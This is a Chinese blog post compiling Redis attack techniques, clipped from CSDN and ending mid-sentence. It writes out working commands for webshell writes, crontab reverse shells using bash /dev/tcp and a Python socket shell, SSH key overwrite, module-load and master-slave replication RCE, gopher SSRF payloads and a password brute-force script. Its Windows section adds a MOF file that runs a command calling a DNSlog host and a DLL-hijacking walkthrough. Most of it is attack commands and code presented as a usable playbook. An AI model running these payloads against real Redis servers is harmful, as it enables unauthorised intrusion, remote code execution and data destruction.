---
title: "Redis利用方式总结(Linux/Windows)-CSDN博客"
source: "https://blog.csdn.net/qq_26091745/article/details/117222362?utm_source=app&app_version=4.17.2&code=app_1562916241&uLinkId=usr1mkqgl919blen"
author:
published:
created: 2025-05-23
description: "文章浏览阅读2k次，点赞2次，收藏12次。简述本文收录整理了https://xz.aliyun.com/t/7940  https://www.redmango.top/article/51 等文章感谢作者们无私分享利用redis优秀姿势，整理后方便大家查阅Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务_redis利用"
tags:
  - "clippings"
---
### 简述

本文收录整理了https://xz.aliyun.com/t/7940 https://www.redmango.top/article/51 等文章

感谢作者们无私分享利用redis优秀姿势，整理后方便大家查阅

> Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 [ANSI](https://so.csdn.net/so/search?q=ANSI&spm=1001.2101.3001.7020) [C语言](https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80) 编写、支持网络、可基于内存亦可持久化的日志型、Key-Value [数据库](https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728) ，并提供多种语言的API。
> 
> Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复制。存盘可以有意无意的对数据进行写操作。由于完全实现了发布/订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助。

redis有5种数据结构，如下：

- String
- Hash
- List
- Set
- Sorted Set

具体怎么使用网上资料不少本文就不过多讲述。

主要认识一下有一个叫做keys的东西。

#### keys

获取redis中所有可用的key

```
keys *
1
```

### Linux下的漏洞利用

关于redis的其他介绍请自行搜索，下面讲讲关键的东西，也就是 [reids](https://so.csdn.net/so/search?q=reids&spm=1001.2101.3001.7020) 的漏洞利用。

#### 未授权访问

##### 原因

默认情况下，redis直接绑定在0.0.0.0:6379上，并且默认情况下密码会为空，此时若服务器上没有对访问ip，端口进行限制，设置密码等措施，那么此时攻击者可以未授权访问redis，轻则获取到redis内的数据，重则可以配合redis其他漏洞取得服务器权限，需要注意的是redis3.2版本后新增 `protected-mode` 配置，默认是 yes，即开启,外部网络无法连接 redis 服务；在复现时可以编辑 `redis.conf` 文件，注释掉 `bind 127.0.0.1` ， 将 `protected-mode` 修改为 no ， [启动redis](https://so.csdn.net/so/search?q=%E5%90%AF%E5%8A%A8redis&spm=1001.2101.3001.7020) -server `./src/redis-server`

##### 利用

最直接最简单的一个的就是未设防6379端口直连，通常通过nmap扫出来6379端口就需要认识到这一个是redis的端口，那么可以尝试直连，eg:

```
redis-cli -h [靶机 IP] -p 6379
1
```

此时无需密码即可连上目标机器的redis，还是挺容易见到的，上一个遇见到的就是bilibili-1024-ctf中的flag8。

我们可以利用 `keys *` 来获取到其key，通过get来获取其值，biliibilictf中的flag就是直接藏在了键值对中。

#### 经典回顾

因为这些套路也都是些老套路了，其实大同小异都是通过config写配置文件，进一步获取shell，所以就归纳到了一起。

先了解一下config的一些东西：

dir：设置快照文件的存放路径，这个配置项一定是个目录，而不能是文件名。使用上面的 dbfilename 作为保存的文件名。

```
127.0.0.1:6379> config get dir
1) "dir"
2) "/Users/hhhm/Security/XXXX
123
```

获取到的redis的路径。

dbfilename ：设置快照的文件名，默认是 dump.rdb

```
127.0.0.1:6379> config get dbfilename
1) "dbfilename"
2) "dump.rdb"
123
```

那么有get自然有set，我们可以通过set来修改其dbfilename以及dir从而把我们的shell写入目标机。

环境推荐直接用ubuntu机器搭建一个php环境跟redis。

##### webshell

这里为了较为直观的看到我们的php文件内容，环境我直接在win10虚拟机上启动redis跟phpstudy；此时因为未设置redis口令，宿主机可以直连redis。（win下启动可能需要指定一下配置文件 `redis-server.exe redis.windows.conf` ）

简单几条命令如下：

```
192.168.242.129:6379> config set dir c:\phpstudy_pro\WWW
OK
192.168.242.129:6379> config set dbfilename hack.php
OK
192.168.242.129:6379> set x "<?php phpinfo();?>"
OK
192.168.242.129:6379> save
OK
12345678
```

![img](https://i-blog.csdnimg.cn/blog_migrate/ed1fd1e61bf4b421fc327539a168b618.png)

回到win10上看一下会发现写入成功，只是多了一些杂数据， 但并不会影响我们马儿的运行：

![img](https://i-blog.csdnimg.cn/blog_migrate/4c18415c68b26f38fdf4e2c42d84b6c7.png)

![img](https://i-blog.csdnimg.cn/blog_migrate/dc7582a8be52a337343a1badba28911e.png)

phpinfo依旧执行成功。

##### 定时任务

定时任务弹shell的话需要换用一台ubuntu机器，安装什么的就不多说，环境可以直接 docker 拉一个版本<3.2即可。

了解一下定时任务的两个位置

- /var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，如/var/spool/cron/root
- /etc/crontab 这个文件负责调度各种管理和维护任务。

同样的使用config来写：

```
set x "\n* * * * * bash -i >& /dev/tcp/ip/port 0>&1\n"
config set dir /var/spool/cron/
config set dbfilename root
save
1234
```

反弹方式不限于bash，如python

```
*/1 * * * * python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
1
```

需要注意的是ubuntu下会因为夹杂了脏数据导致语法无法识别而任务失效；但对于 centos 系统则没有影响，可以成功被利用。

##### 写ssh

条件比较苛刻，需要root权限启动redis，且机器允许密钥登陆。

```
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "xxxx"
save
1234
```

利用条件较少，网上资料多，这里不多讲述。

关于定时任务以及公钥有师傅写了个脚本：https://github.com/JoyChou93/hackredis，可以参考利用。

##### 小提示

网上的文章中可能会有多一句flushall在最前面，因为可能当前redis已经存在足够多的key了，所以如果写入webshell或者定时任务的话会导致文件大小超出如php所能容纳的最大大小，因此通常来说都会加多这么一句，当然了后果就是redis内的键值对都删掉了（如果数据重要的话影响很大）。

#### 模块加载rce

##### 模块

redis4.0以上区别于以下版本在于其多出一个模块，允许我们加载外部的so文件，通过在配置文件中设置（loadmodule /path/to/mymodule.so）/使用module load（MODULE LOAD /path/to/mymodule.so）命令加载so文件，实现在redis内执行我们的自定义命令，可以理解为我们可以自写插件来扩展redis的功能。

##### 漏洞利用

利用方式很简单，如果我们拿到webshell，并且登陆上redis后通过webshell上传动态链接库即so文件后，通过redis的module load加载动态链接库即可rce，因为redis加载so文件所需要的权限在一般的www-data的644权限来说是可以满足的，所以此种方式在实际中是用得上的。

因为懒得搭php-redis模拟从web上传到模块加载，因此我直接docker映射目录将exp.so传到docker中，分别执行如下命令：

```
module load /data/exp.so
system.exec "id"
12
```

![img](https://i-blog.csdnimg.cn/blog_migrate/6049664b63c16146521ff640b3237472.png)

漏洞利用成功，此时可以执行任意命令。

#### 主从复制RCE

相信很多人都听过这个东西，有段时间是一个大热的漏洞，浏览各大版块时经常能看到，那么这个漏洞的利用方式确实很有意思，在了解漏洞前先了解一下什么是主从。

##### 主从复制

> 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
> 
> 默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。
> 
> 并且从节点也可以设置为其他节点的主节点，此时就达成了一个集群。

为了模拟主从复制，首先在本机上起两个docker，我起了两台5.0的redis，分别连上，这里显示一下我两台redis分别对应端口以及主从：

```
master:6300
slave:6301
12
```

那么从节点要复制主节点则使用命令：

```
slaveof ip port
1
```

因此我先在6300上随意set一个键值对然后在6301的redis上执行：

```
slaveof 192.168.43.172 6300
1
```

然后直接keys \*获取所有键，然后再在主机上设置一个键值对，再获取键，结果如下：

\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-N3TVKZE9-1621836175848)(https://cdn.redmango.top/img/20201110150303.png)\]

也就是说只要我们的从节点链接上主节点后会与主节点进行同步，此时主节点所作为就可以影响到从节点，redis4.0以下可以通过主从复制把shell写入键值中；redis4.0以上则有下文中将讲到的利用方式。

##### 配合模块加载rce

##### 原理

先前在模块加载rce中我们成功利用模块加载执行任意命令；那么我们在主从中，master加载了so文件后，从机通过同步也会将master的so文件同步到slave上并加载，从而让我们达成rce，但这里想要加载so文件的话需要一个全量复制才会将我们的模块文件发送到slave上。

我们可以尝试在服务器中nc一个端口，然后我们的redis用slaveof命令指定为我们的服务器+端口，然后我们就会收到redis的请求：

```
*1
$4
PING
123
```

那么我们如果向其回复+OK，就会收到如下：

![img](https://i-blog.csdnimg.cn/blog_migrate/ffd147f6d26dff077ad26d81c8d431a3.png)

会发现我们事实上是可以模拟其服务端构建一个恶意服务端将我们的so文件通过主从复制同步到目标机器中达成rce。

##### 漏洞利用

复现过程如下，需要项目：

- [恶意端](https://github.com/Ridter/redis-rce)
- [exp.so](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)

执行恶意端后显示如下：

![img](https://i-blog.csdnimg.cn/blog_migrate/e6bb6f3c56c4ac5647c5bff238c30180.png)

此时我们通过redis-cli连上目标机后可以通过 `system.exec "cmd"` 调用任意命令。

![img](https://i-blog.csdnimg.cn/blog_migrate/d5f0276dd21b264ce0962cd82fb4ef38.png)

#### ssrf打redis

通常来说ctf中常见的还是ssrf的利用，通过ssrf打redis有必要了解一下。

##### 数据包

ssrf因为一个gopher协议大大拓宽了攻击面，使用过gopher的会知道我们需要对需要发送的包进行抓包然后编码通过gopher协议进行发送，因此有必要先了解一下redis传输时的数据包。

wireshark抓一下本地包过滤一下端口即可拿到我们的redis发送的数据：

![img](https://i-blog.csdnimg.cn/blog_migrate/e33b24a670ee29df97d37cf47744f33e.png)

关于这串东西可以简单了解一下：

- \*3表示set a 1 这样的以空格为分割的元组的属性个数
- $3 
	         
	        
	          表示 
	         
	        
	          s 
	         
	        
	          e 
	         
	        
	          t 
	         
	        
	          的长度，同理往下的 
	         
	        
	       
	         3表示set的长度，同理往下的 
	        
	       
	     3表示set的长度，同理往下的$ 都是表示长度

既然我们分析出来了这个东西代表的实际意义，那么我们就可以进行伪造，如果我们将 [恶意代码](http://bbs.ichunqiu.com/portal.php) ，如先前的写webshell、ssh、定时任务等进行编码后通过gopher协议发送到存在着redis的机器上，那么就可以达成ssrf打redis。

我们可以在本地尝试

##### webshell\\定时任务\\密钥\\模块加载

工具生成：https://github.com/firebroo/sec\_tools/tree/master/redis-over-gopher

工具用法都有，如果不好使就url编码再发送。

##### gopher爆破弱口令

如果遇到了redis在内网的情况下又存在着密码，此时可以尝试爆破弱口令，我们可以试着抓一下流量包看看是以什么形式发送的。

本地可以先用:

```
config set requirepass "123456"
1
```

来设置密码进行测试，用-a指定密码，wireshark抓流量会发现如下：

\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-ej321nEJ-1621836175856)(https://cdn.redmango.top/img/20201112155404.png)\]

这里需要伪造的字段只有密码的长度以及密码，所以我们可以很轻易的写一个脚本进行测试。

我们直接curl发gopher包会发现返回一个 `-NOAUTH Authentication required.`

这里编码的话应该记得的是其结尾为\\r\\n，即 `%0d%0a` ，可以采用脚本编码：

```
import urllib
import requests
test =\
"""*2
$4
AUTH
$6
123456
"""
tmp = urllib.parse.quote(test)
new = tmp.replace('%0A','%0D%0A')
result = '_'+new
print(result)
#在浏览器中记得再次url编码
1234567891011121314
```

我们将上面的串复制下来后编码发包，会得到如下：

![img](https://i-blog.csdnimg.cn/blog_migrate/dfc9d5fca207b4e2c7910ebcffc0ce16.png)

然后如果尝试发送一个错误的密码会得到如下：

![img](https://i-blog.csdnimg.cn/blog_migrate/9fcb5a0839fbd2a3fc93dfa123c935cc.png)

有两个不同回显那么我们就可以对此进行脚本编写了，记得最后写入一个quit才能够断开连接，这里是采用curl爆破密码：

```
import urllib
import requests
import os

payload =\
"""*2
$4
AUTH
${0}
{1}
QUIT
"""

with open("top500.txt") as f:
    for i in f:
        password = i.strip()
        length = len(password)
        poc = payload.format(length,password)
        tmp = urllib.parse.quote(poc)
        new = tmp.replace('%0A','%0D%0A')
        result = '_'+new
        result = "gopher://192.168.242.129:6379/"+result
        status = os.system('curl %s'%result)
        if status:
            print(password)
            break
1234567891011121314151617181920212223242526
```

只需要根据题目改改脚本即可写成一个ssrf发gopher，ps(请自己根据实际需求修改)：

```
import urllib
import requests
import os

payload =\
"""*2
$4
AUTH
${0}
{1}
QUIT
"""
u ="http://127.0.0.1/?url={0}"

with open("top500.txt") as f:
    for i in f:
        password = i.strip()
        length = len(password)
        poc = payload.format(length,password)
        tmp = urllib.parse.quote(poc)
        new = tmp.replace('%0A','%0D%0A')
        result = '_'+new
        result = "gopher://192.168.242.129:6379/"+result
        url = u.format(result)
        print(url)
12345678910111213141516171819202122232425
```

如果要进行其他操作，如爆破完弱口令后执行写webshell等操作，可以把这里的quit去掉后将payload拼接在后面即可。

##### 主从复制

ssrf打主从复制的话我们需要将slave of命令通过gopher发到目标机上，为此我们没办法使用先前的脚本一键打，这里有师傅写了一个被动连接的服务端：https://github.com/Dliv3/redis-rogue-server

在有公网的vps上启动服务端，将下面的内容用上面的脚本编码后gopher发包即可，ip跟端口记得修改。

```
*4
$6
config
$3
set
$3
dir
$5
/tmp/
*4
$6
config
$3
set
$10
dbfilename
$9
module.so
*3
$7
slaveof
$7        //ip长度
test.cn //ip
$4        //端口长度
8080 //端口
*3
$6
module
$4
load
$14
/tmp/module.so
*2
$11
system.exec
$2
id
*1
$4
quit
12345678910111213141516171819202122232425262728293031323334353637383940
```

## Windows下的漏洞利用

### 0x01 写无损文件

在生产环境中，直接通过Redis写文件很可能会携带脏数据，由于Windows环境对Redis的getshell并不友好，很多操作并不是直接getshell，可能需要利用Redis写入二进制文件、快捷方式等，那么这个时候写入无损文件就非常重要了。  
这里推荐一款工具——RedisWriteFile。其原理是利用Redis的主从同步写数据，脚本将自己模拟为master，设置对端为slave，这里master的数据空间是可以保证绝对干净的，因此就轻松实现了写无损文件了。  
命令格式如下：  
`python RedisWriteFile.py --rhost=[target_ip] --rport=[target_redis_port] --lhost=[evil_master_host] --lport=[random] --rpath="[path_to_write]" --rfile="[filename]" --lfile=[filename]`  
给出该工具的下载地址： [RedisWriteFile](https://github.com/r35tart/RedisWriteFile)  
在我们的服务器中运行该脚本（目标Redis一定要能回连我们的服务器才行）：

[![img](https://i-blog.csdnimg.cn/blog_migrate/46fce243daed8d9b1eac6a8dabacd9e2.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100513-23dc856e-b5bf-1.jpeg)

Redis服务器中显示其被设置为slave，同步数据并写入文件：

[![img](https://i-blog.csdnimg.cn/blog_migrate/c9576cc86f320a216f640044e65c010f.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100612-470819fe-b5bf-1.jpeg)

[![img](https://i-blog.csdnimg.cn/blog_migrate/5b03c264188a9be2011db3cda608f278.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100620-4c2fe286-b5bf-1.jpeg)

### 0x02 getshell

从上面的描述以及测试可以确定，目前我们有一个Redis用户权限进行任意写，因此问题也就等价于：在Windows中如何通过新建/覆盖文件达到执行任意命令的效果。

#### 1.最理想的情况

如果碰到Redis的机器上有Web，并且可以泄露其绝对路径的话那真是撞大运了，直接写Webshell即可。

#### 2.启动项

这也是网上各种“教程”中最常提到的方法。有些文章中玩出了花样，有用ps脚本的、远程加载ps脚本的、下载到本地执行的…但其实终究还是没有脱离启动项这个trigger。 [可以参考这篇文章，利用白名单程序比直接写exe马要更隐蔽](https://blog.csdn.net/qq_33020901/article/details/81476386)  
和Linux不太相同，Windows的自启动有几类：系统服务、计划任务、注册表启动项、用户的startup目录。其中前三种是无法通过单纯向某目录中写文件实现精准篡改的，因此只有startup目录可以利用。  
startup的绝对路径如下：  
`C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`  
虽然想知道用户名并不容易，但把常用的用户名挨个跑一遍，万一就成功了呢？  
如果目录不存在，写操作会失败，报错信息如下：

[![img](https://i-blog.csdnimg.cn/blog_migrate/de47408ef6e957c365a9a948d4f4b92b.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100656-6177b3bc-b5bf-1.jpeg)

若目录存在，但没有权限写入，报错信息如下：

[![img](https://i-blog.csdnimg.cn/blog_migrate/4bff97ac0f4f4ba5c0d330db74b24eaa.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100710-69fd5384-b5bf-1.jpeg)

若目录存在，且写文件成功，如下：

[![img](https://i-blog.csdnimg.cn/blog_migrate/3a90d5326ee601bfb41880eaa3c1cd93.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100920-b733f93c-b5bf-1.jpeg)

[![img](https://i-blog.csdnimg.cn/blog_migrate/db0933353238c8561db7928e070c1f4b.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100941-c3e1396a-b5bf-1.jpeg)

这里其实是在赌一件事情：管理员将Redis添加了服务项并配了一个高权限（如Administrator甚至SYSTEM），这样的话默认账户的路径就一定可写了。  
当然，启动项写进去了，还要让主机重启才可以生效，如果没有BDoS类的漏洞也就只能被动等待，这是比较尴尬的。

#### 3.篡改&劫持

这里主要指的是通过写文件覆盖已有的文件或劫持DLL以达到欺骗的目的，虽然还是被动等待上线，但概率明显要比等机器重启要高得多。  
方法包括但不限于如下：

```
系统DLL劫持（需要目标重启或注销）
针对特定软件的DLL劫持（需要知道软件的绝对路径，需要目标一次点击）
覆写目标的快捷方式（需要知道用户名，需要目标一次点击）
覆写特定软件的配置文件达到提权目的（目标无需点击或一次点击，主要看是什么软件）
覆写sethc.exe粘滞键（需要可以登录3389）

#上面涉及系统目录的操作，前提是Redis权限很高，不然没戏。
1234567
```

比较通用的方法是向system32目录下写文件，但NT6及以上操作系统的UAC必须关掉，或Redis以SYSTEM权限启动，否则脚本显示成功但实际上是无法写入的。  
关掉UAC后，测试证明普通管理员可成功写入：

\[![img](https://i-blog.csdnimg.cn/blog_migrate/081432aea6f0a88bfcc96fe14974dbef.jpeg)

但经过测试这种方法确实有写入的可能，但并不能覆盖原来的文件，还是非常被动。倒不如写个快捷方式马（当然前提还是知道用户名，不然效果也不好）：  
![img](https://i-blog.csdnimg.cn/blog_migrate/15b9ebc85a6160dabcc5b8c214aea2da.jpeg) ![img](https://i-blog.csdnimg.cn/blog_migrate/9ac3b62be89b54637caf3416a82a862b.jpeg)

#### 4.mof

如果目标机器是03那就比较幸运了，不用再被动等待人为操作了。  
托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：C:/windows/system32/wbem/mof/nullevt.mof，其作用是每隔五秒就会去监控进程创建和死亡。但这个默认5秒执行一次的设定只有03及以下系统才会有…  
例如如下脚本执行时会执行系统命令：

```
#pragma namespace("\\\\.\\root\\subscription") 

instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
}; 

instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"ping sfas.g9bubn.ceye.io \")"; 
}; 

instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};
12345678910111213141516171819202122232425
```

将其保存为nullevt.mof并写入C:/windows/system32/wbem/mof路径下，而且由于03没有默认UAC的控制，只要权限够就可以直接写入。  
写入后几秒钟脚本就会执行，执行成功会放在good文件夹，失败放在bad文件夹。：

[![img](https://i-blog.csdnimg.cn/blog_migrate/0a89e515be78b771e68154d13396fdbf.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624101146-0e4efd52-b5c0-1.jpeg)

再看DNSlog，收到请求：

[![img](https://i-blog.csdnimg.cn/blog_migrate/2d4cfa2c3d4cb6a839e4850959035914.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624101204-18de7ad6-b5c0-1.jpeg)

### 0x03 总结

总体来说目前Windows的Redis getshell还没有发现直来直去一招通杀的方式。当然这主要是由于Windows自身特性以及Redis不（出）更（新）新（洞）的缘故。  
但就像没有Redis4.x-5.x主从RCE之前的Linux环境一样，碰到了Redis即使知道有一定可能没权限写入，但还是要把最基础的试它一试，最起码常见的用户名目录要尝试写一写，mof尝试写一写，万一就成了呢？  
运气也是实力的一部分，什么都觉得不可能，什么都不做，那就什么都不会有。

### 0x04.DLL Hijacking

DLL劫持相关技术已经存在很久了，现在依然可以运用到权限维持和一些木马、外挂、钓鱼上。关于本文叙述的也是基于DLL劫持的方法，关于这个姿势，相信有不少师傅肯定都知道，只是出于某种原因还未公布而已，或者我没有搜索到。

本文主要讲 Redis on Windows 本身的DLL劫持利用。

有师傅可能会想，不是有主从复制RCE的姿势嘛？需要这么麻烦吗？  
是因为主从复制后的 关键功能 `MODULE LOAD` 在4.0.0 之后开始支持，而我从github上找到的Windows版本最新也仅为:  
[![img](https://i-blog.csdnimg.cn/blog_migrate/c31326bbfe58970b64c08751bcc5f34d.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135852-1090e120-dd2a-1.jpg)

### 过程

#### 目标环境

`OS:` Windows Server 2012  
`Redis:` 3.2.100  
`Role:` Administrator  
`Port:` 80,3389,6379

接下去我会讲讲整个发现过程。

#### 常规套路

首先我看到了 `80` 端口,这应该是个好信号，因为说不定就可以直接写Webshell，并且还是IIS。那么根据IIS默认安装，发布目录应该是在 `C:\inetpub\wwwroot` 下。

通过常规操作，dbfilename 写文件，的确可以正常将asp写进去，但是因为 Windows Server 2012 安装IIS的时候，并不会主动帮助你勾选 ASP / ASP.NET 运行环境，所以即使能写ASP马，也不能解析。

[![img](https://i-blog.csdnimg.cn/blog_migrate/2006d96cb0237b566c03370b4816b112.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135853-11013290-dd2a-1.jpg)

#### 3389 旁路攻击

`RDP` 看起来似乎除了暴破，没什么更好的方法。

如果存在 `CVE-2019-0708`,你也可以选择使用 `0708 Bluekeep` 把主机打重启使之运行启动项中的恶意文件（这是非常不好的做法）。

那么之前的文献中也提到过DLL劫持的方法，所以看看RDP在连接过程中会不会存在DLL劫持了？

本着试试的心态，我搭建了相同的环境,使用 `Procmon` 进行分析。

> 多说一句，如果遇到以下错误，可以下载 [KB3033929](https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148) 进行安装。  
> [![img](https://i-blog.csdnimg.cn/blog_migrate/d428e8f451bd27df0b4437b963958f0d.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135853-114b14be-dd2a-1.jpg)

为了保险起见，我们设置比较宽松的 Filter,只显示 Path end with为 dll的结果。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/1218f1561fa8e372911983206e9cae98.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135854-1189a896-dd2a-1.jpg)

[![img](https://i-blog.csdnimg.cn/blog_migrate/3394879a4fad5d52323dc246eaf73a96.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135854-11f13b28-dd2a-1.jpg)

在发起RDP连接的过程中，我的确发现了 在 `Windows Server 2012` 中存在 mstlsapi DLL NAME NOT FOUND 的结果。

为什么说是 2012？因为后来我测试了 Windows Server 2008 / Windows 7 / Windows Server 2003 都没有出现这样结果，但不管怎么样，对于当前环境的确可以试试。

关于 mstlsapi.dll 的详细描述，我并没有找到多少，在之前文献中[  
Cyber Security Awareness Month - Day 9 - Port 3389/tcp (RDP)](https://isc.sans.edu/forums/diary/Cyber+Security+Awareness+Month+Day+9+Port+3389tcp+RDP/7303/) 有提到：

> by default the certificate used for encryption is signed by an RSA private key, which is then stored statically in the file mstlsapi.dll

另外在之前漏洞记录中也存在过一些关于 `MITM-attacks` 的漏洞，根据一些描述猜测应该是许可授权相关的dll。

其实对于劫持利用来说，我们这里也不必一定要了解这个dll的来龙去脉。因为关于DLL 劫持的相关利用，网上已经有很多成熟利用的文章了。

#### 劫持利用

劫持的方式也有很多，之前试过BDF DLL注入，考虑到x64 dll还存在较多问题，所以为了快速达到效果，这里我们使用 kiwings师傅所改的 [DLLHijacker](https://github.com/kiwings/DLLHijacker) 帮助我们生成劫持DLL后的工程项目，以便我们可以自由的修改 `Shellcode` 劫持该DLL,此方法利用函数转发完成，不会破坏原有功能（在测试中发现如果转发失败会直接导致无法关机等各种情况），缺点就是他需要原DLL也同时存在操作系统上。

> 图来自 [https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/](https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/)  
> [![img](https://i-blog.csdnimg.cn/blog_migrate/40a5d9245e097c864cec2fcde95b3998.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135855-123664a0-dd2a-1.jpg)

在使用过程中，原本脚本生成后VS中有乱码问题，所以改一下，我们最好将文件以 `wb` 模式存储。  

至于原DLL文件,操作系统上并没有，但可以在网上很多地方下载或者在存在此dll文件的操作系统上 COPY 过来，建议选择可信来源。

```
> python3 DLLHijacker.py mstlsapi.dll
[!]Find export function :[106]

78 EnumerateAllLicenseServers
 5 EnumerateTlsServer
27 FindEnterpriseServer
28 GetAllEnterpriseServers
49 GetLicenseServersFromReg
.....
41 TLSUpgradeLicenseEx

[+] Generating VS2019 Project for DLLHijacker in folder: C:\Users\g\Desktop\xzdemo\mstlsapi
successfully generated a DLLHijack Project of mstlsapi
12345678910111213
```

脚本会帮助我们转发所有的导出函数，你可以使用 `CFF Explorer` 进一步确认.  
[![img](https://i-blog.csdnimg.cn/blog_migrate/a643ee171d0b62d9b02dd6b0186b3b75.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135856-12cebfa2-dd2a-1.jpg)

打开项目基本不需要做什么改动，做实验可以使用默认的 `Calc shellcode` 即可。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/a416fa073ce7f8a4ac47cc151e482318.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135856-133f1b9e-dd2a-1.jpg)

唯一需要做的就是指定一下原dll的绝对路径，这个路径将是我们等会利用主从复制写文件原始DLL存放路径。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/be98f0aefe8fe413f06f57e3cdfcb669.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135857-13850e56-dd2a-1.jpg)

接下去利用 [RedisWriteFile](https://github.com/r35tart/RedisWriteFile) 写文件即可，先将 `mstlsapi.dll` 放入指定路径。

```
python3 RedisWriteFile.py --rhost=192.168.56.140 --rport=6379 --lhost=192.168.56.1 --rpath="C:\Users\Public\Downloads" --rfile="mstlsapi.dll" --lfile="/tmp/mstlsapi.dll"
1
```

[![img](https://i-blog.csdnimg.cn/blog_migrate/97aff6a85096c69a095693f5b17503cd.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135857-13bb1096-dd2a-1.jpg)

确保文件无损写入。

```
❯ md5 /tmp/mstlsapi.dll
MD5 (/tmp/mstlsapi.dll) = 99cbcb346f7d2473bde579fbbe979981
PS C:\Users\Public\Downloads> Get-FileHash .\mstlsapi.dll -Algorithm MD5

Algorithm       Hash
---------       ----
MD5             99CBCB346F7D2473BDE579FBBE979981
1234567
```

因为 redis 是 `Administrator` 启动的，所以我们可以写入劫持文件到 `C:\Windows`

```
python3 RedisWriteFile.py --rhost=192.168.56.140 --rport=6379 --lhost=192.168.56.1 --rpath="C:\Windows" --rfile="mstlsapi.dll" --lfile="/tmp/mstlsapiJ.dll"
1
```

[![img](https://i-blog.csdnimg.cn/blog_migrate/d4c37a7dfad143635d470dfe0fe382dc.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135858-13f71190-dd2a-1.jpg)

这里需要注意，因为连接是调用是 `NETWORK SERVICE` 权限的svchost 所以 `calc` 并不会在当前用户桌面弹出。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/e092d8fa3db3991a5b78e589b525eef6.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135858-1451b654-dd2a-1.jpg)

接下去连接，发现的确触发了计算器的调用。

[![img](https://i-blog.csdnimg.cn/blog_migrate/429b36dcfcc8012783226ca709b2fe12.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135859-14df1e86-dd2a-1.jpg)

[![img](https://i-blog.csdnimg.cn/blog_migrate/aec4dc9189200520ed13726596a09e0d.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135900-152c2dca-dd2a-1.jpg)

从调用情况，可以看出 `C:\Windows\mstlsapi.dll` 是加载成功了。

> 这里需要注意，在这个场景中当 `LoadLibrary` 完正常dll后，需要在Hijack函数后做一次 `FreeLibrary` 的操作，不然就会出现只能利用一次的情况，因为我们这里是通过DLLMain函数进入然后再最后转发完所有函数进行劫持，  
> 而当前DLL 一旦被宿主进程加载之后，就会保持在内存中，将DLL引入进程空间，随后的重复调用不会再次进入DLLMain，而只是增加 `引用计数`,这样就导致不会触发到我们的Hijack函数，有些情况原函数内部会帮助我们Free。

工程中的 Shellcode 加载方式是创建新的进程然后加载，可能并不会有好的免杀效果，这是只是想提，作者之所以选择创建新的进程是因为这里不能让原本转发阻塞，否则整个DLL加载将会失败。自己在测试的时候不建议直接使用单纯的shellcode加载,比如常见的:

```
